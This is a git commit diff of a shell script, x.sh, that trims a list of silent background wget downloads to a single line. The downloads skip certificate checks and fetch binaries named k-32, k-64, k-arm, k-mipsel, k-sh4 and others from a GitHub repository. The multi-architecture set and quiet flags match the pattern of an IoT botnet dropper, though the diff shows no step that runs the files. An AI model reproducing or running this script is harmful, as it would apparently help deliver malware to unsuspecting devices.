f208b23e3db5195dbd99aed9c3c4b7902b49a911
nbz-hk <nbz-hk@users.noreply.github.com>
2017-01-16 13:25:18 -0500

    Update x.sh

--- x.sh
+++ x.sh
@@ -1,7 +1,1 @@
 wget --quiet --no-check-certificate -O k-32 https://github.com/nbz-hk/nbz/blob/master/k-32?raw=true &
-wget --quiet --no-check-certificate -O k-64 https://github.com/nbz-hk/nbz/blob/master/k-64?raw=true &
-wget --quiet --no-check-certificate -O k-arm https://github.com/nbz-hk/nbz/blob/master/k-arm?raw=true &
-wget --quiet --no-check-certificate -O k-armv7 https://github.com/nbz-hk/nbz/blob/master/k-armv7?raw=true &
-wget --quiet --no-check-certificate -O k-mipsel https://github.com/nbz-hk/nbz/blob/master/k-mipsel?raw=true &
-wget --quiet --no-check-certificate -O k-powerpc64 https://github.com/nbz-hk/nbz/blob/master/k-powerpc64?raw=true &
-wget --quiet --no-check-certificate -O k-sh4 https://github.com/nbz-hk/nbz/blob/master/k-sh4?raw=true &
